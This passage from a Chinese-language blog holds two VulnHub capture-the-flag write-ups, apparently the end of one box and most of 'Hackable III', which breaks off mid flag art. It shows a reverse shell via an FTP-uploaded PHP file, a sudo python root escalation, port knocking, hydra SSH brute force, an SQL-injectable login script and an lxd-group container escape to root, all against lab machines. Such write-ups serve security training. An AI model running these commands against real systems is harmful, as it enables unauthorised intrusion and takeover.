<p>用户名为：anonymous，密码为空，直接回车即可。</p>
<p>从中下载得到一个文件 CALL.html，内容如下： <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>onion<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>GET READY TO RECEIVE A CALL<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="http服务">2.3. http服务</h2>
<p>访问http服务，发现主页面是apache2的界面，通过路径扫描，发现存在一个路径
/files，访问得到与 ftp 一样的文件。</p>
<p>其实主页面还有一个提示，查看源码即可发现存在这么一行注释：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Do you like gobuster? dirb? etc...</span><br></pre></td></tr></table></figure></p>
<p>然后路径扫描得到files，最后得到 CALL.html。</p>
<h1 id="get-shell">3. get shell</h1>
<p>通过http服务得知，ftp中的文件，会在files中显示出来，如果我们能够上传文件的话，即可反弹shell。</p>
<p>先利用ftp上传一个 shell.php</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524134139.png" /></p>
<p>查看 files 出现了我们上传的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524134207.png" /></p>
<p>kali监听对应端口，然后访问该文件，成功反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524134242.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>在 /home 目录下发现了一文件 important.txt，里面的内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run the script to see the data</span><br><span class="line"></span><br><span class="line">/.runme.sh</span><br></pre></td></tr></table></figure></p>
<p>直接运行该脚本，得到一串字符（直接查看该脚本的内容也可以）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shrek:cf4c2232354952690368f1b3dfdfb24d</span><br></pre></td></tr></table></figure></p>
<p>这看起来应该是用户名和密码。不过直接使用该密码不行，进行md5解密得到密码为：onion</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524134758.png" /></p>
<p>成功拿到 shrek 的权限。</p>
<p>然后读取 .bash_history ，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">sudo -l</span><br><span class="line">su</span><br><span class="line">sudo python3.5 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">su</span><br><span class="line">su root</span><br><span class="line">sudo python3.5 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">su root</span><br><span class="line">sudo python3.5 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">su</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
<p>根据内容，shrek用户好像存在sudo权限。利用 <code>sudo -l</code>
进行查看：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524134950.png" /></p>
<p>可以以root权限执行 python3.5 ，那么直接使用 .bash_history
中的命令即可提权： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo python3.5 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524135038.png" /></p>
<p>最后读取2个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/shrek/user.txt</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK0OkkkkO0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXOo:&#x27;.            .&#x27;;lkXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXKo&#x27;                        .ckXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXx,                 ........      :OXXXXXXXXXXXXXXXXXXXXX </span><br><span class="line">XXXXXXXXXXXXXXXXXXk.                  .............    &#x27;kXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXK;                    ...............    &#x27;0XXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXX0.          .:lol;.    .....;oxkxo:.....    oXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXX0         .oNMMMMMMMO.  ...lXMMMMMMMWO;...    cXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXK.        lWMMMMMMMMMMW; ..xMMMMMMMMMMMMx....   lXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXX;        kMMMMMMMMMMMMMM..:MMMMMMMMMMMMMM0...    OXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXO        oMMMMMXKXMMMMMMM:.kMMMMMMNKNMMMMMMo...   &#x27;XXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXX,        WMMWl. :OK0MMMMMl.OMMMMo. ,OXXWMMMX...    XXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXX        &#x27;MMM:   0MMocMMMM,.oMMMl   xMMO;MMMM...    kXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXX0        .MMM,    .. ;MMM0 ..NMM:    .. &#x27;MMMW...    kXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXO         XMMX&#x27;     ,NMMX  ..;WMN,     .XMMMO...    xXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXX0         .NMMMXkxkXMMMk   ...,0MMXkxkXMMMMN,...    dXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXX          .xWMMMMMMWk.    .....c0MMMMMMMMk&#x27;....    dXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXl            ,colc&#x27;   .;::o:dc,..&#x27;codxdc&#x27;&#x27;.....    dXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXX         .OOkxxdxxkOOOx ,d.:OOOOkxxxxkkOOd....    xXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXd         oOOOOOOOOOOOOxOOOOOOOOOOOOOOOOO,....    OXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXX.         cOOOOOOOOOOOOOOOOOOOOOOOOOOOx,.....    KXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXO          .xOOOOOOOOOOOOOOOOOOOOOOOkc.......    NXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXX;           ;kOOOOOOOOOOOOOOOOOOOkc.........   ,XXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXX0             ;kOOOOOOOOOOOOOOOd;...........   dXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXX.              ,dOOOOOOOOOOdc&#x27;.............   xXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXX.                 .&#x27;&#x27;&#x27;&#x27;..   ...............   .kXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXK           .;okKNWWWWNKOd:.    ..............   &#x27;kXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXX&#x27;        .dXMMMMMMMMMMMMMMMMWO:    .............   &#x27;kXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXK&#x27;       ,0MMMMMMMMMMMMMMMMMMMMMMWx.   ............    ,KXXXXXX</span><br><span class="line">XXXXXXXXXXXKc       .0MMMMMMMMMMMMMMMMMMMMMMMMMMMk.   ............    xXXXXX</span><br><span class="line">XXXXXXXXXXl        cWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo   .............   :XXXX</span><br><span class="line">XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX</span><br><span class="line">XXXXXXXX.        &#x27;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   &#x27;XX</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">                            ____</span><br><span class="line">        ____....----&#x27;&#x27;&#x27;&#x27;````    |.</span><br><span class="line">,&#x27;&#x27;&#x27;````            ____....----; &#x27;.</span><br><span class="line">| __....----&#x27;&#x27;&#x27;&#x27;````         .-.`&#x27;. &#x27;.</span><br><span class="line">|.-.                .....    | |   &#x27;. &#x27;.</span><br><span class="line">`| |        ..:::::::::::::::| |   .-;. |</span><br><span class="line"> | |`&#x27;-;-::::::::::::::::::::| |,,.| |-=&#x27;</span><br><span class="line"> | |   | ::::::::::::::::::::| |   | |</span><br><span class="line"> | |   | :::::::::::::::;;;;;| |   | |</span><br><span class="line"> | |   | :::::::::;;;2KY2KY2Y| |   | |</span><br><span class="line"> | |   | :::::;;Y2KY2KY2KY2KY| |   | |</span><br><span class="line"> | |   | :::;Y2Y2KY2KY2KY2KY2| |   | |</span><br><span class="line"> | |   | :;Y2KY2KY2KY2KY2K+++| |   | |</span><br><span class="line"> | |   | |;2KY2KY2KY2++++++++| |   | |</span><br><span class="line"> | |   | | ;++++++++++++++++;| |   | |</span><br><span class="line"> | |   | |  ;++++++++++++++;.| |   | |</span><br><span class="line"> | |   | |   :++++++++++++:  | |   | |</span><br><span class="line"> | |   | |    .:++++++++;.   | |   | |</span><br><span class="line"> | |   | |       .:;+:..     | |   | |</span><br><span class="line"> | |   | |         ;;        | |   | |</span><br><span class="line"> | |   | |      .,:+;:,.     | |   | |</span><br><span class="line"> | |   | |    .::::;+::::,   | |   | |</span><br><span class="line"> | |   | |   ::::::;;::::::. | |   | |</span><br><span class="line"> | |   | |  :::::::+;:::::::.| |   | |</span><br><span class="line"> | |   | | ::::::::;;::::::::| |   | |</span><br><span class="line"> | |   | |:::::::::+:::::::::| |   | |</span><br><span class="line"> | |   | |:::::::::+:::::::::| |   | |</span><br><span class="line"> | |   | ::::::::;+++;:::::::| |   | |</span><br><span class="line"> | |   | :::::::;+++++;::::::| |   | |</span><br><span class="line"> | |   | ::::::;+++++++;:::::| |   | |</span><br><span class="line"> | |   |.:::::;+++++++++;::::| |   | |</span><br><span class="line"> | | ,`&#x27;:::::;+++++++++++;:::| |&#x27;&quot;-| |-..</span><br><span class="line"> | |&#x27;   ::::;+++++++++++++;::| |   &#x27;-&#x27; ,|</span><br><span class="line"> | |    ::::;++++++++++++++;:| |     .&#x27; |</span><br><span class="line">,;-&#x27;_   `-._===++++++++++_.-&#x27;| |   .&#x27;  .&#x27;</span><br><span class="line">|    ````&#x27;&#x27;&#x27;----....___-&#x27;    &#x27;-&#x27; .&#x27;  .&#x27;</span><br><span class="line">&#x27;---....____           ````&#x27;&#x27;&#x27;--;  ,&#x27;</span><br><span class="line">            ````&#x27;&#x27;&#x27;&#x27;----....____|.&#x27;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机挺简单的，涉及如下攻击方法：</p>
<ol type="1">
<li>ftp 上传文件</li>
<li>sudo 提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>ftp上传文件</tag>
      </tags>
  </entry>
  <entry>
    <title>HackableⅢ Writeup</title>
    <url>/2022/05/25/Hackable%E2%85%A2%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/hackable-iii,720/">Hackable:
III ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中等</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.55</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.55</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222044.png" /></p>
<p>注意这里的22端口的状态为 filtered，可能是存在端口敲门[[Port
Knocking]]，所以等会需要留一下是否存在端口序列号。</p>
<h2 id="http服务">2.2. http服务</h2>
<p>直接访问80端口，主页面就一张图片，没有其他信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222317.png" /></p>
<p>查看源码得到一行注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>这么一句话其实有许多信息：</p>
<ol type="1">
<li>可能存在着三个用户：jubiscleudo, boss, dev_suport</li>
<li>确实存在 port knocking</li>
<li>某个图片文件</li>
<li>一个域名：hackable3.com</li>
</ol>
<p>不管如何，先将该域名加入 /etc/hosts。之前路径扫描IP得到许多文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222700.png" /></p>
<p>一一访问这些文件。</p>
<p>从 /backup 目录中得到一个 wordlist.txt。</p>
<p>从 /config 目录中得到一个文件 1.txt，内容为
<code>MTAwMDA=</code>，利用base64解码得到 10000。</p>
<p>从 config.php 中得到如下内容： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line">define(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从 login.php 中得到如下内容： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$usuario</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$senha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot; SELECT * FROM usuarios WHERE user = &#x27;<span class="subst">&#123;$usuario&#125;</span>&#x27; and pass = &#x27;<span class="subst">&#123;$senha&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conexao</span>, <span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_num_rows(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">#validaÃ§Ã£o conta</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;usuario&#x27;</span>] = <span class="variable">$usuario</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: 3.jpg&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;nao_autenticado&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: login_page/login.html&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从中得知了一个新的路径，login_page/login.html，这是一个登录界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524224107.png" /></p>
<p>还得到一张图片
3.jpg，可能与注释中的图片文件有关。将3.jpg下载，并且查看是否有隐写：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide --info 3.jpg</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102602.png" /></p>
<p>确实存在隐写，但是需要密码（好像不需要密码🤡）。<del>利用之前得到的
wordlist.txt 进行破解</del>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stegseek 3.jpg wordlist.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102626.png" /></p>
<p>读取其中的内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">porta:65535</span><br></pre></td></tr></table></figure></p>
<p>从 /css 中也得到一个文件 2.txt，内容如下： <figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;++<span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span></span><br></pre></td></tr></table></figure></p>
<p>解密后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4444</span><br></pre></td></tr></table></figure></p>
<h1 id="get-shell">3. get shell</h1>
<p>从上面的信息收集可以知道，22端口存在port
knocking，并且也获得了一个端口序列号：10000, 4444,
65535。于是先后访问这三个端口，然后再次查看22端口的状态：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 10000 10.0.2.55</span><br><span class="line">2. nmap -p 4444 10.0.2.55</span><br><span class="line">3. namp -p 65535 10.0.2.55</span><br></pre></td></tr></table></figure></p>
<p>但是22还是处于filtered状态</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102913.png" /></p>
<p>后来搜索发现，需要使用 knock 这个工具 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">knock 10.0.2.55 10000 4444 65535</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103014.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103020.png" /></p>
<p>22
端口成功开放。然后利用刚刚获得的用户名：jubiscleudo，以及wordlist.txt进行爆破
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 10.0.2.55 ssh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103405.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jubiscleudo:onlymy</span><br></pre></td></tr></table></figure>
<p>利用得到的用户名和密码ssh登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103458.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>在 /var/www/html 下发现了一个文件 .bacup_config.php 内容如下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line">define(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>尝试使用如下命令连接数据库，发现靶机上没有数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u hackable_3 -p </span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525104522.png" /></p>
<p>注意到 /etc/passwd 中有一个用户为:
hackable_3，切换到该用户，查看用户id</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525111710.png" /></p>
<p>注意最后的 lxd，即hackable_3用户是 lxd
组的用户，而lxd组用户是可以提权到root的。</p>
<p>需要分为两大部分：</p>
<ol type="1">
<li>攻击者需要做的</li>
<li>靶机需要做的</li>
</ol>
<p>攻击者需要在kali上执行如下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">2. cd lxd-alpine-builder</span><br><span class="line">3. ./build-alpine # 以root权限</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112303.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112314.png" /></p>
<p>然后将该shell放在一旁。执行完最后一条命令之后，会在该目录下生成一个
tar.gz 的文件，将其发送到靶机。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112401.png" /></p>
<p>靶机上需要执行下面命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alilas shell</span><br><span class="line">2. lxc image list # 查看是否导入</span><br><span class="line">3. lxd init # 然后一直回车就好</span><br><span class="line">4. lxc init shell ignite -c security.privileged=true</span><br><span class="line">5. lxc config device add ignite mydevice disk source=/ path=/mnt/root # 配置容器，将宿主机根目录挂载到容器/mnt/root目录下。</span><br><span class="line">6. lxc start ignite</span><br><span class="line">7. lxc exec ignite /bin/sh</span><br><span class="line">8. chroot /mnt/root</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112826.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113522.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113537.png" /></p>
<p>成功拿到root权限。</p>
<p>最后读取两个flag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/jubiscleudo/.user.txt</span><br><span class="line">%                                              ,%&amp;&amp;%#.                                              </span><br><span class="line">%                                         *&amp;&amp;&amp;&amp;%%&amp;%&amp;&amp;&amp;&amp;&amp;&amp;%                                          </span><br><span class="line">%                                       &amp;&amp;&amp;&amp;            .%&amp;&amp;&amp;                                       </span><br><span class="line">%                                     &amp;&amp;&amp;#                 %&amp;&amp;&amp;                                     </span><br><span class="line">%                                   /&amp;&amp;&amp;                     &amp;&amp;&amp;.                                   </span><br><span class="line">%                                  %&amp;%/                       %&amp;&amp;*                                  </span><br><span class="line">%                                 .&amp;&amp;#     (%%(,     ,(&amp;&amp;*     %&amp;&amp;                                  </span><br><span class="line">%                                 &amp;&amp;%    %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%#    &amp;&amp;&amp;                                 </span><br><span class="line">%                                 &amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;   #&amp;&amp;&amp;&amp;&amp;*   &amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%                                 </span><br><span class="line">%                                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;,   /&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;%                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                  %&amp;&amp;%&amp;&amp;&amp;&amp;              /&amp;&amp;&amp;%&amp;&amp;&amp;%                                  </span><br><span class="line">%                                 &amp;.%&amp;&amp;% %&amp;&amp;%           &amp;&amp;&amp;&amp; %&amp;&amp;/*&amp;                                 </span><br><span class="line">%                              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  %&amp;&amp;&amp;&amp;#   %%&amp;&amp;&amp;&amp;  %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                              </span><br><span class="line">%                           /&amp;%&amp;/   *&amp;&amp;&amp;&amp;&amp;&amp;   %&amp;&amp;&amp;&amp;&amp;&amp;%&amp;   &amp;&amp;&amp;&amp;&amp;&amp;.   %&amp;&amp;&amp;.                           </span><br><span class="line">%                          &amp;&amp;&amp;           &amp;&amp;%&amp;           %%%%          .&amp;&amp;&amp;                          </span><br><span class="line">%                         &amp;&amp;%                                           &amp;&amp;&amp;                         </span><br><span class="line">%                        %&amp;&amp;.   *&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;    /&amp;&amp;(                        </span><br><span class="line">%                       /&amp;&amp;#   #&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*   %&amp;&amp;                        </span><br><span class="line">%                       &amp;&amp;%    